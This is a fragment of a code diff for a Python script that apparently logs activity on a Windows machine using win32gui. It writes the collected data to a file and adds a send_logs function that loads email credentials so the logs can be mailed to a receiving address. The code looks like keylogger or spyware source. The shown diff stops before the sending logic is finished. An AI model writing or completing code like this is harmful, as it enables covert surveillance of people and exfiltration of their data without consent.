@@ -4,6 +4,7 @@ import os
 import requests
 import socket
 import win32gui
+import credentials
 
 absoluteTime = time.ctime(time.time())
 user = os.path.expanduser('~').split('\\')[2]
@@ -57,4 +58,14 @@ def write_file(count):
         writingFile.write(''.join(displayData))
     print('Success writing to file')
 
-    
+def send_logs():
+    count = 0
+
+    sendEmail = credentials.sendfromEmail
+    sendPassword = credentials.sendfromPassword
+
+    receiveEmail = credentials.receiveEmail
+
+    MIN = 10
+    SECONDS = 60
+    time.sleep(30)
